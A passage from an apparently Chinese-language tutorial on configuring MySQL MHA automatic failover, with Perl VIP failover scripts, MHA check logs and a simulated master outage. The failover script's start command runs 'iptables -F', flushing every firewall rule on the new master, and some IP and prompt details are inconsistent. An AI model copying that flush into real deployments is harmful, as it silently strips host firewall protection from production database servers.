root@192.168.73.21(192.168.73.21:22) to root@192.168.73.23(192.168.73.23:22)..Fri May  6 22:31:53 2022 - [debug]   ok.Fri May  6 22:31:55 2022 - [debug]Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.21(192.168.73.21:22)..Fri May  6 22:31:53 2022 - [debug]   ok.Fri May  6 22:31:53 2022 - [debug]  Connecting via SSH from root@192.168.73.23(192.168.73.23:22) to root@192.168.73.22(192.168.73.22:22)..Fri May  6 22:31:54 2022 - [debug]   ok.Fri May  6 22:31:55 2022 - [debug]Fri May  6 22:31:52 2022 - [debug]  Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.21(192.168.73.21:22)..Fri May  6 22:31:53 2022 - [debug]   ok.Fri May  6 22:31:53 2022 - [debug]  Connecting via SSH from root@192.168.73.22(192.168.73.22:22) to root@192.168.73.23(192.168.73.23:22)..Fri May  6 22:31:54 2022 - [debug]   ok.Fri May  6 22:31:55 2022 - [info] All SSH connection tests passed successfully.[root@ctos7mini ~]&amp;</code></pre><p>&#x5404;&#x4E2A;&#x8282;&#x70B9;ssh&#x9A8C;&#x8BC1;&#x90FD;&#x662F;ok&#x624D;&#x6B63;&#x5E38;</p><p><strong>&#xFF08;4&#xFF09;.&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x590D;&#x5236;&#x73AF;&#x5883;&#x72B6;&#x51B5;</strong></p><p>&#x914D;&#x7F6E;VIP</p><pre><code class="shell">[root@ctos7mini ~]&amp; ifconfig ens33[root@rhel7 ~]&amp; ip -4 addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000    inet 192.168.73.21/24 brd 192.168.73.255 scope global ens33       valid_lft forever preferred_lft forever[root@ctos7mini ~]&amp; ip addr add 192.168.73.73/24 brd 192.168.10.255 dev ens33 label ens33:1[root@ctos7mini ~]&amp; ip -4 addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000    inet 192.168.73.20/24 brd 192.168.73.255 scope global ens33       valid_lft forever preferred_lft forever    inet 192.168.73.73/24 brd 192.168.10.255 scope global secondary ens33:1       valid_lft forever preferred_lft forever[root@ctos7mini ~]&amp;</code></pre><p><strong>&#x521B;&#x5EFA;&#x81EA;&#x52A8;&#x5207;&#x6362;&#x811A;&#x672C;</strong></p><pre><code class="shell">[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_failover</code></pre><pre><code class="perl">#!/usr/bin/env perluse strict;use warnings FATAL =&gt; &apos;all&apos;;use Getopt::Long;my (    $command,          $ssh_user,        $orig_master_host, $orig_master_ip,    $orig_master_port, $new_master_host, $new_master_ip,    $new_master_port);my $vip = &apos;192.168.73.73&apos;;my $brdc = &apos;192.168.73.255&apos;;my $ifdev = &apos;ens33&apos;;my $key = &apos;1&apos;;my $ssh_start_vip = &quot;/usr/sbin/ip addr add $vip/24 brd $brdc dev $ifdev label $ifdev:$key;/usr/sbin/arping -q -A -c 1 -I $ifdev:$key $vip;iptables -F;&quot;;my $ssh_stop_vip = &quot;/usr/sbin/ip addr del $vip/24 dev $ifdev label $ifdev:$key&quot;;GetOptions(    &apos;command=s&apos;          =&gt; \$command,    &apos;ssh_user=s&apos;         =&gt; \$ssh_user,    &apos;orig_master_host=s&apos; =&gt; \$orig_master_host,    &apos;orig_master_ip=s&apos;   =&gt; \$orig_master_ip,    &apos;orig_master_port=i&apos; =&gt; \$orig_master_port,    &apos;new_master_host=s&apos;  =&gt; \$new_master_host,    &apos;new_master_ip=s&apos;   =&gt; \$new_master_ip,    &apos;new_master_port=i&apos;  =&gt; \$new_master_port,);exit &amp;main();sub main {    print &quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;;    if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) {        my $exit_code = 1;        eval {            print &quot;Disabling the VIP on old master: $orig_master_host \n&quot;;            &amp;stop_vip();            $exit_code = 0;        };        if ($@) {            warn &quot;Got Error: $@\n&quot;;            exit $exit_code;        }        exit $exit_code;    }    elsif ( $command eq &quot;start&quot; ) {        my $exit_code = 10;        eval {            print &quot;Enabling the VIP - $vip on the new master - $new_master_host \n&quot;;            &amp;start_vip();            $exit_code = 0;        };        if ($@) {            warn $@;            exit $exit_code;        }        exit $exit_code;    }    elsif ( $command eq &quot;status&quot; ) {        print &quot;Checking the Status of the script.. OK \n&quot;;        exit 0;    }    else {        &amp;usage();        exit 1;    }}sub start_vip() {    `ssh $ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`;}# A simple system call that disable the VIP on the old_mastersub stop_vip() {    `ssh $ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`;}sub usage {    print    &quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;;}</code></pre><pre><code class="shell">[root@ctos7mini ~]&amp; vim /usr/local/bin/master_ip_online_change</code></pre><pre><code class="perl">#!/usr/bin/env perluse strict;use warnings FATAL =&gt;&apos;all&apos;;use Getopt::Long;#my $vip = &apos;172.25.0.100/24&apos;;  # Virtual IPmy $vip = &apos;192.168.73.73/24&apos;;  # Virtual IPmy $key = &quot;1&quot;;my $ssh_start_vip = &quot;/sbin/ifconfig ens33:$key $vip&quot;;my $ssh_stop_vip = &quot;/sbin/ifconfig ens33:$key down&quot;;my $exit_code = 0;my (  $command,              $orig_master_is_new_slave, $orig_master_host,  $orig_master_ip,       $orig_master_port,         $orig_master_user,  $orig_master_password, $orig_master_ssh_user,     $new_master_host,  $new_master_ip,        $new_master_port,          $new_master_user,  $new_master_password,  $new_master_ssh_user,);GetOptions(  &apos;command=s&apos;                =&gt; \$command,  &apos;orig_master_is_new_slave&apos; =&gt; \$orig_master_is_new_slave,  &apos;orig_master_host=s&apos;       =&gt; \$orig_master_host,  &apos;orig_master_ip=s&apos;         =&gt; \$orig_master_ip,  &apos;orig_master_port=i&apos;       =&gt; \$orig_master_port,  &apos;orig_master_user=s&apos;       =&gt; \$orig_master_user,  &apos;orig_master_password=s&apos;   =&gt; \$orig_master_password,  &apos;orig_master_ssh_user=s&apos;   =&gt; \$orig_master_ssh_user,  &apos;new_master_host=s&apos;        =&gt; \$new_master_host,  &apos;new_master_ip=s&apos;          =&gt; \$new_master_ip,  &apos;new_master_port=i&apos;        =&gt; \$new_master_port,  &apos;new_master_user=s&apos;        =&gt; \$new_master_user,  &apos;new_master_password=s&apos;    =&gt; \$new_master_password,  &apos;new_master_ssh_user=s&apos;    =&gt; \$new_master_ssh_user,);exit &amp;main();sub main {#print &quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;;if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) {        # $orig_master_host, $orig_master_ip, $orig_master_port are passed.        # If you manage master ip address at global catalog database,        # invalidate orig_master_ip here.        my $exit_code = 1;        eval {            print &quot;\n\n\n***************************************************************\n&quot;;            print &quot;Disabling the VIP - $vip on old master: $orig_master_host\n&quot;;            print &quot;***************************************************************\n\n\n\n&quot;;&amp;stop_vip();            $exit_code = 0;        };        if ($@) {            warn &quot;Got Error: $@\n&quot;;            exit $exit_code;        }        exit $exit_code;}elsif ( $command eq &quot;start&quot; ) {        # all arguments are passed.        # If you manage master ip address at global catalog database,        # activate new_master_ip here.        # You can also grant write access (create user, set read_only=0, etc) here.my $exit_code = 10;        eval {            print &quot;\n\n\n***************************************************************\n&quot;;            print &quot;Enabling the VIP - $vip on new master: $new_master_host \n&quot;;            print &quot;***************************************************************\n\n\n\n&quot;;&amp;start_vip();            $exit_code = 0;        };        if ($@) {            warn $@;            exit $exit_code;        }        exit $exit_code;}elsif ( $command eq &quot;status&quot; ) {        print &quot;Checking the Status of the script.. OK \n&quot;;        `ssh $orig_master_ssh_user\@$orig_master_host \&quot; $ssh_start_vip \&quot;`;        exit 0;}else {&amp;usage();        exit 1;}}# A simple system call that enable the VIP on the new mastersub start_vip() {`ssh $new_master_ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`;}# A simple system call that disable the VIP on the old_mastersub stop_vip() {`ssh $orig_master_ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`;}sub usage {print&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;;}[root@ctos7mini ~]#</code></pre><p>&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6743;&#x9650;</p><pre><code class="shell">[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_failover[root@ctos7mini ~]&amp; chmod 755 /usr/local/bin/master_ip_online_change[root@ctos7mini ~]&amp; grep /usr/local/bin/master_ip_failover /etc/masterha/app1.cnfmaster_ip_failover_script= /usr/local/bin/master_ip_failover[root@ctos7mini ~]&amp;</code></pre><p><strong>&#x901A;&#x8FC7;masterha_check_repl&#x811A;&#x672C;&#x67E5;&#x770B;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x7684;&#x72B6;&#x6001;</strong></p><pre><code class="mbox">[root@ctos7mini ~]&amp; masterha_check_repl --conf=/etc/masterha/app1.cnfFri May  6 22:54:08 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May  6 22:54:08 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May  6 22:54:08 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May  6 22:54:08 2022 - [info] MHA::MasterMonitor version 0.54.Fri May  6 22:54:09 2022 - [info] Dead Servers:Fri May  6 22:54:09 2022 - [info] Alive Servers:Fri May  6 22:54:09 2022 - [info]   192.168.73.21(192.168.73.21:3306)Fri May  6 22:54:09 2022 - [info]   192.168.73.22(192.168.73.22:3306)Fri May  6 22:54:09 2022 - [info]   192.168.73.23(192.168.73.23:3306)Fri May  6 22:54:09 2022 - [info] Alive Slaves:Fri May  6 22:54:09 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May  6 22:54:09 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)Fri May  6 22:54:09 2022 - [info]     Primary candidate for the new Master (candidate_master is set)Fri May  6 22:54:09 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May  6 22:54:09 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)Fri May  6 22:54:09 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Fri May  6 22:54:09 2022 - [info] Checking slave configurations..Fri May  6 22:54:09 2022 - [info] Checking replication filtering settings..Fri May  6 22:54:09 2022 - [info]  binlog_do_db= ha, binlog_ignore_db= mysqlFri May  6 22:54:09 2022 - [info]  Replication filtering check ok.Fri May  6 22:54:09 2022 - [info] Starting SSH connection tests..Fri May  6 22:54:12 2022 - [info] All SSH connection tests passed successfully.Fri May  6 22:54:12 2022 - [info] Checking MHA Node version..Fri May  6 22:54:14 2022 - [info]  Version check ok.Fri May  6 22:54:14 2022 - [info] Checking SSH publickey authentication settings on the current master..Fri May  6 22:54:14 2022 - [info] HealthCheck: SSH to 192.168.73.21 is reachable.Fri May  6 22:54:15 2022 - [info] Master MHA Node version is 0.54.Fri May  6 22:54:15 2022 - [info] Checking recovery script configurations on the current master..Fri May  6 22:54:15 2022 - [info]   Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/var/lib/mysql --output_file=/tmp/save_binary_logs_test --manager_version=0.54 --start_file=mysql-bin-master.000002Fri May  6 22:54:15 2022 - [info]   Connecting to root@192.168.73.21(192.168.73.21)..  Creating /tmp if not exists..    ok.  Checking output directory is accessible or not..   ok.  Binlog found at /var/lib/mysql, up to mysql-bin-master.000002Fri May  6 22:54:15 2022 - [info] Master setting check done.Fri May  6 22:54:15 2022 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..Fri May  6 22:54:15 2022 - [info]   Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.22 --slave_ip=192.168.73.22 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info  --relay_dir=/var/lib/mysql/  --slave_pass=xxxFri May  6 22:54:15 2022 - [info]   Connecting to root@192.168.73.22(192.168.73.22:22)..  Checking slave recovery environment settings..    Opening /var/lib/mysql/relay-log.info ... ok.    Relay log found at /var/lib/mysql, up to rhel_sqlsrv-relay-bin.000003    Temporary relay log file is /var/lib/mysql/rhel_sqlsrv-relay-bin.000003    Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done.    Testing mysqlbinlog output.. done.    Cleaning up test file(s).. done.Fri May  6 22:54:26 2022 - [info]   Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.23 --slave_ip=192.168.73.23 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info  --relay_dir=/var/lib/mysql/  --slave_pass=xxxFri May  6 22:54:26 2022 - [info]   Connecting to root@192.168.73.23(192.168.73.23:22)..  Checking slave recovery environment settings..    Opening /var/lib/mysql/relay-log.info ... ok.    Relay log found at /var/lib/mysql, up to ctos_sqlsrv-relay-bin.000011    Temporary relay log file is /var/lib/mysql/ctos_sqlsrv-relay-bin.000011    Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done.    Testing mysqlbinlog output.. done.    Cleaning up test file(s).. done.Fri May  6 22:54:37 2022 - [info] Slaves settings check done.Fri May  6 22:54:37 2022 - [info]192.168.73.21 (current master) +--192.168.73.22 +--192.168.73.23Fri May  6 22:54:37 2022 - [info] Checking replication health on 192.168.73.22..Fri May  6 22:54:37 2022 - [info]  ok.Fri May  6 22:54:37 2022 - [info] Checking replication health on 192.168.73.23..Fri May  6 22:54:37 2022 - [info]  ok.Fri May  6 22:54:37 2022 - [info] Checking master_ip_failover_script status:Fri May  6 22:54:37 2022 - [info]   /usr/local/bin/master_ip_failover --command=status --ssh_user=root --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306IN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===Checking the Status of the script.. OKFri May  6 22:54:37 2022 - [info]  OK.Fri May  6 22:54:37 2022 - [warning] shutdown_script is not defined.Fri May  6 22:54:37 2022 - [info] Got exit code 0 (Not master dead).MySQL Replication Health is OK.</code></pre><p><code>MySQL Replication Health is NOT OK!</code> &#x5982;&#x679C;&#x63D0;&#x793A;&#x8FD9;&#x4E2A;&#x4E0D;OK&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x53C2;&#x8003;&#x6700;&#x540E;&#x7AE0;&#x8282;&#xFF09;<br><code>MySQL Replication Health is OK.</code>&#x663E;&#x793A;Ok &#xFF0C;&#x6B63;&#x5E38;&#xFF01;</p><p>&#x53C2;&#x6570;&#x8C03;&#x8BD5;&#xFF1A;</p><pre><code class="shell">ln -s /usr/local/mysql57/bin/mysqlbinlog /usr/local/bin/mysqlbinlogln -s /usr/local/mysql57/bin/mysql /usr/local/bin/mysql[root@ctos7mini ~]&amp; grep master_ip_failover /etc/masterha/app1.cnf#master_ip_failover_script= /usr/local/bin/master_ip_failover</code></pre><p><strong>&#xFF08;5&#xFF09;&#x68C0;&#x67E5;MHA Manager&#x7684;&#x72B6;&#x6001;&#xFF1A;</strong></p><p>&#x901A;&#x8FC7;master_check_status&#x811A;&#x672C;&#x67E5;&#x770B;Manager&#x7684;&#x72B6;&#x6001;&#xFF1A;</p><pre><code class="shell">[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnfapp1 is stopped(2:NOT_RUNNING).[root@ctos7mini ~]&amp;</code></pre><p>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x6B63;&#x5E38;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x201D;PING_OK&#x201D;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x663E;&#x793A;&#x201D;NOT_RUNNING&#x201D;&#xFF0C;&#x8FD9;&#x4EE3;&#x8868;MHA&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x5F00;&#x542F;</p><p><strong>&#xFF08;6&#xFF09;&#x5F00;&#x542F;MHA Manager&#x76D1;&#x63A7;</strong></p><pre><code>nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;</code></pre><p>&#x542F;&#x52A8;&#x53C2;&#x6570;&#x4ECB;&#x7ECD;&#xFF1A;</p><pre><code>--remove_dead_master_conf    &#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5F53;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x8001;&#x7684;&#x4E3B;&#x5E93;&#x7684;ip&#x5C06;&#x4F1A;&#x4ECE;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x79FB;&#x9664;--manger_log                 &#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x4F4D;&#x7F6E;--ignore_last_failover       &#x5728;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;MHA&#x68C0;&#x6D4B;&#x5230;&#x8FDE;&#x7EED;&#x53D1;&#x751F;&#x5B95;&#x673A;&#xFF0C;&#x4E14;&#x4E24;&#x6B21;&#x5B95;&#x673A;&#x95F4;&#x9694;&#x4E0D;&#x8DB3;8&#x5C0F;&#x65F6;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;Failover&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x9650;&#x5236;&#x662F;&#x4E3A;&#x4E86;&#x907F;&#x514D;ping-pong&#x6548;&#x5E94;&#x3002;&#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5FFD;&#x7565;&#x4E0A;&#x6B21;MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x4EA7;&#x751F;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MHA&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x4F1A;&#x5728;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x6211;&#x8BBE;&#x7F6E;&#x7684;/data&#x4EA7;&#x751F;app1.failover.complete&#x6587;&#x4EF6;&#xFF0C;&#x4E0B;&#x6B21;&#x518D;&#x6B21;&#x5207;&#x6362;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5C06;&#x4E0D;&#x5141;&#x8BB8;&#x89E6;&#x53D1;&#x5207;&#x6362;&#xFF0C;&#x9664;&#x975E;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5207;&#x6362;&#x540E;&#x6536;&#x5230;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#xFF0C;&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x4E3A;--ignore_last_failover</code></pre><p>&#x7EE7;&#x7EED;&#x68C0;&#x67E5;MHA Manager&#x76D1;&#x63A7;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;</p><pre><code class="shell">[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnfapp1 (pid:2803) is running(0:PING_OK), master:192.168.73.21[6]-  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[7]+  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[root@ctos7mini ~]&amp; jobs[1]+  Running                 nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;[root@ctos7mini ~]&amp;</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x5DF2;&#x7ECF;&#x5728;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x800C;&#x4E14;master&#x7684;&#x4E3B;&#x673A;&#x4E3A;192.168.73.21</p><p><strong>&#xFF08;7&#xFF09;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;</strong></p><pre><code class="mbox">[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.logFri May  6 23:16:28 2022 - [info]  OK.Fri May  6 23:16:28 2022 - [warning] shutdown_script is not defined.Fri May  6 23:16:28 2022 - [info] Set master ping interval 1 seconds.Fri May  6 23:16:28 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.Fri May  6 23:16:28 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..Fri May  6 23:16:32 2022 - [warning] Got error when monitoring master:  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 446.Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln448] Target master&apos;s advisory lock is already held by someone. Please check whether you monitor the same master from multiple monitoring processes.Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln468] Error happened on health checking.  at /usr/bin/masterha_manager line 50.Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May  6 23:16:32 2022 - [info] Got exit code 1 (Not master dead).[root@ctos7mini ~]&amp;</code></pre><p>&#x6E05;&#x7A7A;&#x65E5;&#x5FD7;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x95ED;&#x76D1;&#x63A7;</p><pre><code class="shell">[root@ctos7mini ~]&amp; echo &gt; /var/log/masterha/app1/manager.log[root@ctos7mini ~]&amp; masterha_stop --conf=/etc/masterha/app1.cnfStopped app1 successfully.[1]+  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[root@ctos7mini ~]&amp;</code></pre><p>&#x7EE7;&#x7EED;&#x5F00;&#x542F;&#x76D1;&#x63A7;</p><pre><code>nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;</code></pre><p>&#x89C2;&#x770B;&#x65E5;&#x5FD7;</p><pre><code class="shell">[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.logIN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===Checking the Status of the script.. OKFri May  6 23:30:53 2022 - [info]  OK.Fri May  6 23:30:53 2022 - [warning] shutdown_script is not defined.Fri May  6 23:30:53 2022 - [info] Set master ping interval 1 seconds.Fri May  6 23:30:53 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.Fri May  6 23:30:53 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..Fri May  6 23:30:53 2022 - [info] Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..[root@ctos7mini ~]&amp;</code></pre><p>&#x5176;&#x4E2D;<code>Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..</code>&#x8BF4;&#x660E;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x5DF2;&#x7ECF;&#x5F00;&#x59CB;&#x76D1;&#x63A7;&#x4E86;</p><p><strong>&#xFF08;9&#xFF09;&#x6A21;&#x62DF;&#x6545;&#x969C;</strong></p><p>&#x505C;&#x6389;MySQL&#x4E3B;&#x5E93;</p><pre><code>[root@rhel7 ~]# systemctl stop mysqld</code></pre><p>&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#xFF0C;&#x89C2;&#x5BDF;&#x96C6;&#x7FA4;&#x72B6;&#x51B5;</p><pre><code class="mbox">[root@ctos7mini ~]&amp; tail -n 20 /var/log/masterha/app1/manager.log----- Failover Report -----app1: MySQL Master failover 192.168.73.21 to 192.168.73.22 succeededMaster 192.168.73.21 is down!Check MHA Manager logs at ctos7mini:/var/log/masterha/app1/manager.log for details.Started automated(non-interactive) failover.Invalidated master IP address on 192.168.73.21.The latest slave 192.168.73.22(192.168.73.22:3306) has all relay logs for recovery.Selected 192.168.73.22 as a new master.192.168.73.22: OK: Applying all logs succeeded.192.168.73.22: OK: Activated master IP address.192.168.73.23: This host has the latest relay log events.Generating relay diff files from the latest slave succeeded.192.168.73.23: OK: Applying all logs succeeded. Slave started, replicating from 192.168.73.22.192.168.73.22: Resetting slave info succeeded.Master failover to 192.168.73.22(192.168.73.22:3306) completed successfully.[root@ctos7mini ~]&amp;</code></pre><p>&#x67E5;&#x770B;192.168.73.22&#x7684;slave&#x72B6;&#x6001;&#xFF1A;</p><pre><code class="sql">mysql&gt; show slave status\GEmpty set (0.00 sec)mysql&gt;</code></pre><p>&#x67E5;&#x770B;192.168.73.23&#x7684;slave&#x72B6;&#x6001;</p><pre><code class="sql">mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.73.22                  Master_User: slave                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-slave2.000002          Read_Master_Log_Pos: 1048               Relay_Log_File: ctos_sqlsrv-relay-bin.000002                Relay_Log_Pos: 323        Relay_Master_Log_File: mysql-slave2.000002             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:.................................................&#x7701;&#x7565;.......................................................             Master_Server_Id: 3                  Master_UUID: 90e5e492-cd2d-11ec-88d4-000c299254eb             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400                  Master_Bind:.................................................&#x7701;&#x7565;.......................................................1 row in set (0.00 sec)mysql&gt;</code></pre><p>&#x4E3B;&#x5E93;&#x53D8;&#x6210;&#x4E86;192.168.73.22&#xFF01;</p><p>&#x67E5;&#x770B;&#x5907;&#x7528;&#x4E3B;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF1A;</p><pre><code class="mbox">[root@ctos_sqlsrv ~]&amp; ip addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000    link/ether 00:0c:29:27:5c:d4 brd ff:ff:ff:ff:ff:ff    inet 192.168.73.23/24 brd 192.168.73.255 scope global ens33       valid_lft forever preferred_lft forever    inet 192.168.73.73/24 brd 192.168.73.255 scope global secondary ens33:1       valid_lft forever preferred_lft forever    inet6 fe80::412f:a64f:e2ff:e154/64 scope link       valid_lft forever preferred_lft forever[root@ctos_sqlsrv ~]&amp;</code></pre><p>ip&#x6F02;&#x79FB;&#x5230;&#x4E86;&#x5907;&#x7528;master&#x4E0A;</p><p>&#x5F00;&#x542F;down&#x6389;&#x7684;master&#xFF0C;&#x624B;&#x52A8;&#x8FDB;&#x884C;&#x5207;&#x6362;&#x4E3B;&#x5E93;&#xFF1A;</p><pre><code class="mbox"> [root@ctos7mini ~]&amp; masterha_master_switch --conf=/etc/masterha/app1.cnf --master_state=alive --new_master_host=192.168.73.21 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000Sat May  7 03:08:13 2022 - [info] MHA::MasterRotate version 0.54.Sat May  7 03:08:13 2022 - [info] Starting online master switch..Sat May  7 03:08:13 2022 - [info]Sat May  7 03:08:13 2022 - [info] * Phase 1: Configuration Check Phase..Sat May  7 03:08:13 2022 - [info]Sat May  7 03:08:13 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May  7 03:08:13 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May  7 03:08:13 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May  7 03:08:14 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Sat May  7 03:08:14 2022 - [info] Alive Slaves:Sat May  7 03:08:14 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) 